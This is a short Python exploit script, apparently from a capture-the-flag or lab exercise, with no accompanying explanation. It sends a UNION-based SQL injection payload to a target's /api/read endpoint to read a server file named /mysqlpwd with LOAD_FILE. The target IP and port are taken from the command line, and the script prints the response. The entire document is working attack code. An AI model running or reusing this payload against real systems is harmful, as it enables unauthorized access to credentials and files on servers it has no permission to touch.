import requests
import sys

IP = sys.argv[1]
PORT = '3355'
if len(sys.argv) > 2:
  PORT = sys.argv[2]

payload = '''-1" UNION ALL SELECT LOAD_FILE('/mysqlpwd') -- '''

print(requests.get(f'http://{IP}:{PORT}/api/read?secretId=-1;password={payload}').text)
